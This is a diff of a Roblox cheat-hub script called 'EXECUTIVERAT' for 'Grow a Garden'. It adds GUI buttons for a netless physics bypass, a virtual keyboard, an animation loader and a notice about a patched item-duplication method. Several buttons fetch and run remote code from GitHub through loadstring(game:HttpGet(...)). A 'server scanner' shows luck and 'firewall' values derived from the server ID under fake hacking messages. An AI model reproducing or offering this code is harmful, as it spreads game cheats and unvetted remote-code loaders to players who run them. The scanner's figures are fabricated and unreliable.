+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.DUPLICATION.UICorner
+G2L["1c"] = Instance.new("UICorner", G2L["1b"]);
+
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.DUPLICATION.LocalScript
+G2L["1d"] = Instance.new("LocalScript", G2L["1b"]);
+
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.eh
+G2L["1e"] = Instance.new("TextButton", G2L["17"]);
+G2L["1e"]["TextWrapped"] = true;
+G2L["1e"]["BorderSizePixel"] = 0;
+G2L["1e"]["TextSize"] = 14;
+G2L["1e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(242, 206, 3);
+G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["1e"]["Size"] = UDim2.new(0, 54, 0, 49);
+G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e"]["Text"] = [[No Lag]];
+G2L["1e"]["Name"] = [[eh]];
+G2L["1e"]["Position"] = UDim2.new(0.73484, 0, 0.18421, 0);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.eh.UICorner
+G2L["1f"] = Instance.new("UICorner", G2L["1e"]);
+
+
+
+-- StarterGui.ScreenGui.MAINFRAME.CREDITS
+G2L["20"] = Instance.new("TextLabel", G2L["2"]);
+G2L["20"]["BorderSizePixel"] = 0;
+G2L["20"]["TextSize"] = 14;
+G2L["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20"]["BackgroundTransparency"] = 1;
+G2L["20"]["Size"] = UDim2.new(0, 214, 0, 31);
+G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20"]["Text"] = [[EXECUTIVERAT - MADE IN THE SEWER]];
+G2L["20"]["Name"] = [[CREDITS]];
+G2L["20"]["Position"] = UDim2.new(0.0112, 0, -0, 0);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.Minimize
+G2L["21"] = Instance.new("TextButton", G2L["2"]);
+G2L["21"]["BorderSizePixel"] = 0;
+G2L["21"]["TextSize"] = 14;
+G2L["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["21"]["BackgroundTransparency"] = 1;
+G2L["21"]["Size"] = UDim2.new(0, 42, 0, 32);
+G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["21"]["Text"] = [[|||]];
+G2L["21"]["Name"] = [[Minimize]];
+G2L["21"]["Rotation"] = 90;
+G2L["21"]["Position"] = UDim2.new(0.94118, 0, -0, 0);
+
+
+-- StarterGui.ScreenGui.MAINFRAME.opengui
+G2L["22"] = Instance.new("TextButton", G2L["2"]);
+G2L["22"]["BorderSizePixel"] = 0;
+G2L["22"]["TextSize"] = 14;
+G2L["22"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22"]["Size"] = UDim2.new(0, 45, 0, 43);
+G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["Name"] = [[opengui]];
+G2L["22"]["Position"] = UDim2.new(-0.00069, 0, 1.04629, 0);
+
+
+-- StarterGui.ScreenGui.DPOP
+G2L["23"] = Instance.new("Frame", G2L["1"]);
+G2L["23"]["Visible"] = false;
+G2L["23"]["Active"] = true;
+G2L["23"]["BorderSizePixel"] = 0;
+G2L["23"]["BackgroundColor3"] = Color3.fromRGB(171, 255, 255);
+G2L["23"]["Size"] = UDim2.new(0, 444, 0, 279);
+G2L["23"]["Position"] = UDim2.new(0.18336, 0, 0.09455, 0);
+G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23"]["Name"] = [[DPOP]];
+
+
+-- StarterGui.ScreenGui.DPOP.Frame
+G2L["24"] = Instance.new("Frame", G2L["23"]);
+G2L["24"]["BorderSizePixel"] = 0;
+G2L["24"]["BackgroundColor3"] = Color3.fromRGB(84, 84, 84);
+G2L["24"]["Size"] = UDim2.new(0, 421, 0, 209);
+G2L["24"]["Position"] = UDim2.new(0.02252, 0, 0.17921, 0);
+G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+
+
+-- StarterGui.ScreenGui.DPOP.Frame.UICorner
+G2L["25"] = Instance.new("UICorner", G2L["24"]);
+
+
+
+-- StarterGui.ScreenGui.DPOP.Frame.DESCRIPTION
+G2L["26"] = Instance.new("TextLabel", G2L["24"]);
+G2L["26"]["TextWrapped"] = true;
+G2L["26"]["BorderSizePixel"] = 0;
+G2L["26"]["TextSize"] = 29;
+G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["BackgroundTransparency"] = 1;
+G2L["26"]["Size"] = UDim2.new(0, 390, 0, 189);
+G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26"]["Text"] = [[THE DUPLICATION METHOD IS NOW PATCHED, WE SINCERELY APOLOGIZE FOR THIS INCONVINIENCE, WERE STILL TRYING TO BRING IT BACK. THANK YOU AND SEE YOU SOON !!]];
+G2L["26"]["Name"] = [[DESCRIPTION]];
+G2L["26"]["Position"] = UDim2.new(0.03563, 0, -0.05263, 0);
+
+
+-- StarterGui.ScreenGui.DPOP.Frame.CLOSE
+G2L["27"] = Instance.new("TextButton", G2L["24"]);
+G2L["27"]["BorderSizePixel"] = 0;
+G2L["27"]["TextSize"] = 14;
+G2L["27"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27"]["BackgroundColor3"] = Color3.fromRGB(101, 255, 4);
+G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["27"]["Size"] = UDim2.new(0, 252, 0, 26);
+G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27"]["Text"] = [[I UNDERSTAND - CLOSE]];
+G2L["27"]["Name"] = [[CLOSE]];
+G2L["27"]["Position"] = UDim2.new(0.19477, 0, 0.82297, 0);
+
+
+-- StarterGui.ScreenGui.DPOP.Frame.CLOSE.LocalScript
+G2L["28"] = Instance.new("LocalScript", G2L["27"]);
+
+
+
+-- StarterGui.ScreenGui.DPOP.UICorner
+G2L["29"] = Instance.new("UICorner", G2L["23"]);
+
+
+
+-- StarterGui.ScreenGui.DPOP.NOTICE
+G2L["2a"] = Instance.new("TextLabel", G2L["23"]);
+G2L["2a"]["BorderSizePixel"] = 0;
+G2L["2a"]["TextSize"] = 49;
+G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a"]["BackgroundTransparency"] = 1;
+G2L["2a"]["Size"] = UDim2.new(0, 200, 0, 50);
+G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a"]["Text"] = [[NOTICE !]];
+G2L["2a"]["Name"] = [[NOTICE]];
+G2L["2a"]["Position"] = UDim2.new(0.26802, 0, -0.01075, 0);
+
+
+-- StarterGui.ScreenGui.DPOP.UIAspectRatioConstraint
+G2L["2b"] = Instance.new("UIAspectRatioConstraint", G2L["23"]);
+G2L["2b"]["AspectRatio"] = 1.5914;
+
+
+-- StarterGui.ScreenGui.DPOP.UIScale
+G2L["2c"] = Instance.new("UIScale", G2L["23"]);
+
+
+
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.KEYBOARD.LocalScript
+local function C_8()
+local script = G2L["8"];
+	-- Place this inside your keyboard GUI TextButton
 	local button = script.Parent
-	local mainFrame = button.Parent.Parent -- Goes up to ScrollingFrame then to MainFrame
-	local debounce = false
+	local coreGui = game:GetService("CoreGui")
+	
+	local function createKeyboardGUI()
+		-- Load the keyboard script
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/mob.txt', true))()
+	
+		local KeyboardguiWarriorRoberrVersion = Instance.new("ScreenGui")
+		KeyboardguiWarriorRoberrVersion.Name = "Keyboard gui WarriorRoberr Version"
+		KeyboardguiWarriorRoberrVersion.Parent = coreGui
+		KeyboardguiWarriorRoberrVersion.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	
+		local Drag = Instance.new("Frame")
+		Drag.Name = "Drag"
+		Drag.Parent = KeyboardguiWarriorRoberrVersion
+		Drag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		Drag.BorderSizePixel = 0
+		Drag.Position = UDim2.new(0.15, 0, 0.06, 0)
+		Drag.Size = UDim2.new(0, 270, 0, 30)
+		Drag.Active = true
+		Drag.Draggable = true
+	
+		local Close = Instance.new("TextButton")
+		Close.Name = "Close"
+		Close.Parent = Drag
+		Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+		Close.BorderSizePixel = 0
+		Close.Position = UDim2.new(0.925, 0, 0, 0)
+		Close.Size = UDim2.new(0, 30, 0, 30)
+		Close.Font = Enum.Font.SourceSans
+		Close.Text = "X"
+		Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Close.TextSize = 20.000
+	
+		-- Move the keyboard into our custom GUI
+		if coreGui:FindFirstChild("BUNB0yBUN BOARD") then
+			local keyboard = coreGui["BUNB0yBUN BOARD"].KeyBoard
+			keyboard.Parent = Drag
+			keyboard.Position = UDim2.new(0, 0, 0, 35)
+	
+			if keyboard:FindFirstChild("Bunb0ybun") then
+				keyboard.Bunb0ybun.Text = "BETTER VERSION"
+				keyboard.Bunb0ybun.TextSize = 10
+			end
+	
+			coreGui["BUNB0yBUN BOARD"]:Destroy()
+		end
+	
+		Close.MouseButton1Click:Connect(function()
+			KeyboardguiWarriorRoberrVersion:Destroy()
+		end)
+	end
+	
+	button.Activated:Connect(function()
+		createKeyboardGUI()
+	
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "EXECUTIVERAT",
+			Text = "Virtual Keyboard Loaded",
+			Duration = 3
+		})
+	end)
+end;
+task.spawn(C_8);
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.Netless Bypass.LocalScript
+local function C_b()
+local script = G2L["b"];
+	local button = script.Parent
+	local runService = game:GetService("RunService")
+	local players = game:GetService("Players")
+	local localPlayer = players.LocalPlayer
+	
+	local connections = {}
+	
+	local function cleanUpConnections()
+		for _, conn in ipairs(connections) do
+			conn:Disconnect()
+		end
+		connections = {}
+	end
+	
+	button.Activated:Connect(function()
+		cleanUpConnections() 
+	
+		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+	
+		for _, child in ipairs(character:GetDescendants()) do
+			if child:IsA("BasePart") and child.Name ~= "HumanoidRootPart" then
+				local conn = runService.Heartbeat:Connect(function()
+					if child and child.Parent then
+						child.Velocity = Vector3.new(-30, 0, 0)
+					end
+				end)
+				table.insert(connections, conn)
+			end
+		end
+	
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "EXECUTIVERAT",
+			Text = "Netless Activated",
+			Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+			Duration = 5
+		})
+	end)
+	
+	
+	localPlayer.CharacterAdded:Connect(cleanUpConnections)
+end;
+task.spawn(C_b);
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.universal.RESET CHARACTER.LocalScript
+local function C_f()
+local script = G2L["f"];
+	-- Place this LocalScript inside your GUI button
+	local button = script.Parent
+	local player = game.Players.LocalPlayer
+	
+	local function resetCharacter()
+		player:LoadCharacter()
+	end
+	
+	button.MouseButton1Click:Connect(resetCharacter)
+end;
+task.spawn(C_f);
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.animations.ANIMATION !.LocalScript
+local function C_13()
+local script = G2L["13"];
+	-- LocalScript inside the TextButton
+	
+	local button = script.Parent
 	
 	button.MouseButton1Click:Connect(function()
-		if debounce then return end
-		debounce = true
-	
-		-- Visual feedback
-		local originalText = button.Text
-		local originalColor = button.BackgroundColor3
-	
-		button.Text = "SCANNING..."
-		button.BackgroundColor3 = Color3.fromRGB(0, 100, 200) -- Blue during scan
-	
-		-- Execute the external script with error handling
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250621_fb7786.lua"))()
+		local success, result = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/LolnotaKid/SCRIPTSBYVEUX/main/UFWboo.txt"))()
 		end)
 	
-		-- Results handling
-		if success then
-			button.Text = "SCANNING!"
-			if mainFrame:FindFirstChild("ScanResults") then
-				mainFrame.ScanResults.Text = "External script executed successfully"
-			end
-		else
-			button.Text = "SCAN FAILED!"
-			if mainFrame:FindFirstChild("ScanResults") then
-				mainFrame.ScanResults.Text = "Error: "..tostring(err):sub(1, 100)
-			end
-			warn("ServerScanner Error:", err)
+		if not success then
+			warn("Error executing script: " .. tostring(result))
+		end
+	end)
+	
+end;
+task.spawn(C_13);
+-- StarterGui.ScreenGui.MAINFRAME.MAIN.grow a garden.Frame.SERVER SCANNER.LocalScript
+local function C_1a()
+local script = G2L["1a"];
+	-- Place this LocalScript inside your 'SERVER SCANNER' TextButton
+	local button = script.Parent
+	local player = game:GetService("Players").LocalPlayer
+	local gui = player:WaitForChild("PlayerGui"):WaitForChild("ScreenGui")
+	local tweenService = game:GetService("TweenService")
+	local runService = game:GetService("RunService")
+	local lighting = game:GetService("Lighting")
+	local textService = game:GetService("TextService")
+	
+	-- ================ UI CONSTRUCTOR ================
+	local function createScannerUI()
+		-- Persistent data storage
+		local serverData = {
+			jobId = game.JobId,
+			scanResults = nil,
+			firstScanTime = os.time()
+		}
+	
+		-- Main scanner container
+		local scannerContainer = Instance.new("Frame")
+		scannerContainer.Name = "ScannerContainer"
+		scannerContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+		scannerContainer.Position = UDim2.new(1.5, 0, 0.5, 0) -- Start off-screen
+		scannerContainer.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
+		scannerContainer.BackgroundTransparency = 0.1
+		scannerContainer.BorderSizePixel = 0
+		scannerContainer.Visible = false
+		scannerContainer.Parent = gui
+	
+		-- Responsive sizing
+		local function updateSize()
+			local viewportSize = workspace.CurrentCamera.ViewportSize
+			local width = math.clamp(viewportSize.X * 0.35, 280, 400)
+			local height = math.clamp(viewportSize.Y * 0.5, 350, 500)
+			scannerContainer.Size = UDim2.new(0, width, 0, height)
 		end
 	
-		-- Reset after 2 seconds
-		task.wait(2)
-		button.Text = originalText
-		button.BackgroundColor3 = originalColor
-		debounce = false
-	end)
-end
-coroutine.wrap(SKFMHJ_fake_script)()
-local function KWGGR_fake_script() -- SeedPack.ToggleWarningFrame 
-	local script = Instance.new('LocalScript', SeedPack)
-
-	local seedpackButton = script.Parent
-	local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-	local screenGui = playerGui:WaitForChild("ScreenGui")
-	local frame = screenGui:WaitForChild("Frame")
-	local warningFrame = frame:WaitForChild("WARNING")
+		updateSize()
+		workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(updateSize)
+		workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateSize)
 	
-	seedpackButton.MouseButton1Click:Connect(function()
-		warningFrame.Visible = true
+		-- UI Corner
+		local corner = Instance.new("UICorner")
+		corner.CornerRadius = UDim.new(0, 8)
+		corner.Parent = scannerContainer
+	
+		-- Glowing border
+		local stroke = Instance.new("UIStroke")
+		stroke.Color = Color3.fromRGB(0, 200, 100)
+		stroke.Thickness = 1.5
+		stroke.Transparency = 0.3
+		stroke.Parent = scannerContainer
+	
+		-- Header with gradient
+		local header = Instance.new("Frame")
+		header.Name = "Header"
+		header.Size = UDim2.new(1, 0, 0.14, 0)
+		header.Position = UDim2.new(0, 0, 0, 0)
+		header.BackgroundColor3 = Color3.fromRGB(10, 15, 20)
+		header.BorderSizePixel = 0
+		header.Parent = scannerContainer
+	
+		local headerCorner = Instance.new("UICorner")
+		headerCorner.CornerRadius = UDim.new(0, 8)
+		headerCorner.Parent = header
+	
+		-- Scanner title
+		local title = Instance.new("TextLabel")
+		title.Name = "Title"
+		title.Text = "SERVER SCANNER v5.0"
+		title.Font = Enum.Font.Code
+		title.TextSize = 18
+		title.TextColor3 = Color3.fromRGB(0, 255, 150)
+		title.BackgroundTransparency = 1
+		title.Size = UDim2.new(0.7, 0, 0.8, 0)
+		title.Position = UDim2.new(0.05, 0, 0.1, 0)
+		title.TextXAlignment = Enum.TextXAlignment.Left
+		title.Parent = header
+	
+		-- Server ID
+		local serverId = Instance.new("TextLabel")
+		serverId.Name = "ServerID"
+		serverId.Text = "SERVER: "..string.sub(serverData.jobId, 1, 6).."..." -- Shortened ID
+		serverId.Font = Enum.Font.Code
+		serverId.TextSize = 12
+		serverId.TextColor3 = Color3.fromRGB(100, 255, 200)
+		serverId.BackgroundTransparency = 1
+		serverId.Size = UDim2.new(0.3, 0, 0.8, 0)
+		serverId.Position = UDim2.new(0.65, 0, 0.1, 0)
+		serverId.TextXAlignment = Enum.TextXAlignment.Right
+		serverId.Parent = header
+	
+		-- Status indicator
+		local statusContainer = Instance.new("Frame")
+		statusContainer.Name = "StatusContainer"
+		statusContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+		statusContainer.Position = UDim2.new(0.05, 0, 0.15, 0)
+		statusContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+		statusContainer.BorderSizePixel = 0
+		statusContainer.Parent = scannerContainer
+	
+		local statusCorner = Instance.new("UICorner")
+		statusCorner.CornerRadius = UDim.new(0, 4)
+		statusCorner.Parent = statusContainer
+	
+		local statusLabel = Instance.new("TextLabel")
+		statusLabel.Name = "Status"
+		statusLabel.Text = "STATUS: [OFFLINE]"
+		statusLabel.Font = Enum.Font.Code
+		statusLabel.TextSize = 14
+		statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+		statusLabel.BackgroundTransparency = 1
+		statusLabel.Size = UDim2.new(1, 0, 1, 0)
+		statusLabel.Position = UDim2.new(0.02, 0, 0, 0)
+		statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+		statusLabel.Parent = statusContainer
+	
+		-- Scan results grid
+		local resultsGrid = Instance.new("Frame")
+		resultsGrid.Name = "ResultsGrid"
+		resultsGrid.Size = UDim2.new(0.9, 0, 0.5, 0)
+		resultsGrid.Position = UDim2.new(0.05, 0, 0.24, 0)
+		resultsGrid.BackgroundTransparency = 1
+		resultsGrid.Parent = scannerContainer
+	
+		-- Create a grid layout
+		local gridLayout = Instance.new("UIGridLayout")
+		gridLayout.CellPadding = UDim2.new(0, 4, 0, 6)
+		gridLayout.CellSize = UDim2.new(0.48, 0, 0.2, 0)
+		gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+		gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+		gridLayout.Parent = resultsGrid
+	
+		-- Metric templates
+		local metrics = {
+			{name = "Srv Version", value = "Roblox/"..game.PlaceVersion},
+			{name = "Credentials", value = player.Name.." ("..player.UserId..")"},
+			{name = "Server Age", value = "00:00:00"},
+			{name = "Server Time", value = os.date("%H:%M:%S")},
+			{name = "Srv Luck", value = "0.00%"},
+			{name = "Seed Luck", value = "0.00%"},
+			{name = "Egg Luck", value = "0.00%"},
+			{name = "Plant Luck", value = "0.00%"},
+			{name = "Data Intgty", value = "0.00%"},
+			{name = "Firewall", value = "Secure"}
+		}
+	
+		-- Create metric cards
+		local metricCards = {}
+		for i, metric in ipairs(metrics) do
+			local card = Instance.new("Frame")
+			card.Name = metric.name.."Card"
+			card.BackgroundColor3 = Color3.fromRGB(15, 20, 25)
+			card.BorderSizePixel = 0
+			card.LayoutOrder = i
+			card.Parent = resultsGrid
+	
+			local cardCorner = Instance.new("UICorner")
+			cardCorner.CornerRadius = UDim.new(0, 4)
+			cardCorner.Parent = card
+	
+			local nameLabel = Instance.new("TextLabel")
+			nameLabel.Name = "Name"
+			nameLabel.Text = metric.name..":"
+			nameLabel.Font = Enum.Font.Code
+			nameLabel.TextSize = 11
+			nameLabel.TextColor3 = Color3.fromRGB(100, 255, 200)
+			nameLabel.BackgroundTransparency = 1
+			nameLabel.Size = UDim2.new(0.95, 0, 0.4, 0)
+			nameLabel.Position = UDim2.new(0.025, 0, 0.05, 0)
+			nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+			nameLabel.Parent = card
+	
+			local valueLabel = Instance.new("TextLabel")
+			valueLabel.Name = "Value"
+			valueLabel.Text = "[PENDING]"
+			valueLabel.Font = Enum.Font.Code
+			valueLabel.TextSize = 12
+			valueLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
+			valueLabel.BackgroundTransparency = 1
+			valueLabel.Size = UDim2.new(0.95, 0, 0.5, 0)
+			valueLabel.Position = UDim2.new(0.025, 0, 0.45, 0)
+			valueLabel.TextXAlignment = Enum.TextXAlignment.Left
+			valueLabel.Parent = card
+	
+			metricCards[metric.name] = valueLabel
+		end
+	
+		-- Terminal output
+		local terminalContainer = Instance.new("Frame")
+		terminalContainer.Name = "TerminalContainer"
+		terminalContainer.Size = UDim2.new(0.9, 0, 0.15, 0)
+		terminalContainer.Position = UDim2.new(0.05, 0, 0.75, 0)
+		terminalContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		terminalContainer.BackgroundTransparency = 0.3
+		terminalContainer.BorderSizePixel = 0
+		terminalContainer.Parent = scannerContainer
+	
+		local terminalCorner = Instance.new("UICorner")
+		terminalCorner.CornerRadius = UDim.new(0, 4)
+		terminalCorner.Parent = terminalContainer
+	
+		local terminalOutput = Instance.new("TextLabel")
+		terminalOutput.Name = "TerminalOutput"
+		terminalOutput.Text = "> SYSTEM READY\n> AWAITING COMMANDS"
+		terminalOutput.Font = Enum.Font.Code
+		terminalOutput.TextSize = 8
+		terminalOutput.TextColor3 = Color3.fromRGB(0, 255, 150)
+		terminalOutput.BackgroundTransparency = 1
+		terminalOutput.Size = UDim2.new(0.95, 0, 0.95, 0)
+		terminalOutput.Position = UDim2.new(0.025, 0, 0.025, 0)
+		terminalOutput.TextXAlignment = Enum.TextXAlignment.Left
+		terminalOutput.TextYAlignment = Enum.TextYAlignment.Top
+		terminalOutput.TextWrapped = true
+		terminalOutput.Parent = terminalContainer
+	
+		-- Control buttons
+		local buttonContainer = Instance.new("Frame")
+		buttonContainer.Name = "ButtonContainer"
+		buttonContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+		buttonContainer.Position = UDim2.new(0.05, 0, 0.87, 0)
+		buttonContainer.BackgroundTransparency = 1
+		buttonContainer.Parent = scannerContainer
+	
+		-- Scan button
+		local scanButton = Instance.new("TextButton")
+		scanButton.Name = "ScanButton"
+		scanButton.Text = "INITIATE SCAN"
+		scanButton.Font = Enum.Font.Code
+		scanButton.TextSize = 13
+		scanButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+		scanButton.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+		scanButton.Size = UDim2.new(0.48, 0, 1, 0)
+		scanButton.Position = UDim2.new(0, 0, 0, 0)
+		scanButton.Parent = buttonContainer
+	
+		local scanButtonCorner = Instance.new("UICorner")
+		scanButtonCorner.CornerRadius = UDim.new(0, 4)
+		scanButtonCorner.Parent = scanButton
+	
+		-- Close button
+		local closeButton = Instance.new("TextButton")
+		closeButton.Name = "CloseButton"
+		closeButton.Text = "CLOSE"
+		closeButton.Font = Enum.Font.Code
+		closeButton.TextSize = 13
+		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+		closeButton.BackgroundColor3 = Color3.fromRGB(100, 20, 30)
+		closeButton.Size = UDim2.new(0.48, 0, 1, 0)
+		closeButton.Position = UDim2.new(0.52, 0, 0, 0)
+		closeButton.Parent = buttonContainer
+	
+		local closeButtonCorner = Instance.new("UICorner")
+		closeButtonCorner.CornerRadius = UDim.new(0, 4)
+		closeButtonCorner.Parent = closeButton
+	
+		-- Blinking cursor effect
+		local showCursor = true
+		runService.Heartbeat:Connect(function(dt)
+			if scannerContainer.Visible then
+				showCursor = not showCursor
+				local cursorText = showCursor and "█" or ""
+				terminalOutput.Text = terminalOutput.Text:gsub("█", "")..cursorText
+			end
+		end)
+	
+		-- Animation functions
+		local function openScanner()
+			scannerContainer.Visible = true
+			local tween = tweenService:Create(scannerContainer, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+				Position = UDim2.new(0.85, 0, 0.5, 0)
+			})
+			tween:Play()
+		end
+	
+		local function closeScanner()
+			local tween = tweenService:Create(scannerContainer, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+				Position = UDim2.new(1.5, 0, 0.5, 0)
+			})
+			tween:Play()
+			tween.Completed:Wait()
+			scannerContainer.Visible = false
+		end
+	
+		-- Generate consistent luck values
+		local function generateLuckValues()
+			if serverData.scanResults then return serverData.scanResults end
+	
+			-- Create consistent values based on server ID
+			local hash = 0
+			for i = 1, #serverData.jobId do
+				hash = (hash * 31 + string.byte(serverData.jobId, i)) % 2^32
+			end
+			local rng = Random.new(hash)
+	
+			serverData.scanResults = {
+				serverLuck = math.floor(rng:NextNumber() * 10000)/100,
+				seedPackLuck = math.floor(rng:NextNumber() * 10000)/100,
+				eggLuck = math.floor(rng:NextNumber() * 10000)/100,
+				plantLuck = math.floor(rng:NextNumber() * 10000)/100,
+				dataIntegrity = math.floor(80 + rng:NextNumber() * 20 * 100)/100,
+				firewallStatus = ({"Secure", "Compromised", "Vulnerable"})[math.floor(rng:NextNumber() * 3) + 1]
+			}
+	
+			return serverData.scanResults
+		end
+	
+		-- Format time display
+		local function formatTime(seconds)
+			local hours = math.floor(seconds / 3600)
+			local minutes = math.floor((seconds % 3600) / 60)
+			local seconds = math.floor(seconds % 60)
+			return string.format("%02d:%02d:%02d", hours, minutes, seconds)
+		end
+	
+		-- Terminal lines with hacker jargon
+		local terminalLines = {
+			"> INIT QUANTUM DECRYPT",
+			"> BYPASS FIREWALL",
+			"> ACCESS SEED MATRIX",
+			"> DECODE LUCK ALGO",
+			"> ANALYZE PROBABILITY",
+			"> ESTABLISH CONNECTION",
+			"> VERIFY INTEGRITY",
+			"> COMPILE REPORT"
+		}
+	
+		local function animateScan()
+			-- Reset UI for new scan
+			terminalOutput.Text = "> INIT SCAN"
+			statusLabel.Text = "STATUS: [SCANNING...]"
+			statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+	
+			-- Reset all metrics to pending
+			for _, card in pairs(metricCards) do
+				card.Text = "[PENDING]"
+				card.TextColor3 = Color3.fromRGB(150, 150, 150)
+			end
+	
+			-- Add terminal output with delays
+			for i, line in ipairs(terminalLines) do
+				task.wait(math.random(3, 7)/10)
+				terminalOutput.Text = terminalOutput.Text.."\n"..line
+	
+				-- Update status with progress
+				statusLabel.Text = "STATUS: [SCAN "..math.floor((i/#terminalLines)*100).."%]"
+			end
+	
+			-- Get luck values
+			local luckValues = generateLuckValues()
+	
+			-- Update metrics
+			task.wait(0.4)
+			metricCards["Srv Version"].Text = "Roblox/"..game.PlaceVersion
+			metricCards["Credentials"].Text = player.Name.." ("..player.UserId..")"
+	
+			-- Calculate server age
+			local age = os.time() - serverData.firstScanTime
+			metricCards["Server Age"].Text = formatTime(age)
+	
+			-- Update luck values
+			task.wait(0.2)
+			metricCards["Srv Luck"].Text = string.format("%.2f%%", luckValues.serverLuck)
+			metricCards["Seed Luck"].Text = string.format("%.2f%%", luckValues.seedPackLuck)
+			metricCards["Egg Luck"].Text = string.format("%.2f%%", luckValues.eggLuck)
+			metricCards["Plant Luck"].Text = string.format("%.2f%%", luckValues.plantLuck)
+	
+			task.wait(0.2)
+			metricCards["Data Intgty"].Text = string.format("%.2f%%", luckValues.dataIntegrity)
+			metricCards["Firewall"].Text = luckValues.firewallStatus
+	
+			-- Update server time
+			metricCards["Server Time"].Text = os.date("%H:%M:%S")
+	
+			-- Complete scan
+			task.wait(0.4)
+			statusLabel.Text = "STATUS: [COMPLETE]"
+			statusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
+			terminalOutput.Text = terminalOutput.Text.."\n> SCAN COMPLETE"
+	
+			-- Flash effect
+			local originalColor = lighting.Ambient
+			for i = 1, 2 do
+				lighting.Ambient = Color3.fromRGB(0, 20, 8)
+				task.wait(0.08)
+				lighting.Ambient = originalColor
+				task.wait(0.08)
+			end
+	
+			-- Update colors for metrics
+			for _, card in pairs(metricCards) do
+				card.TextColor3 = Color3.fromRGB(0, 255, 150)
+			end
+		end
+	
+		-- Return the UI elements and functions
+		return {
+			container = scannerContainer,
+			open = openScanner,
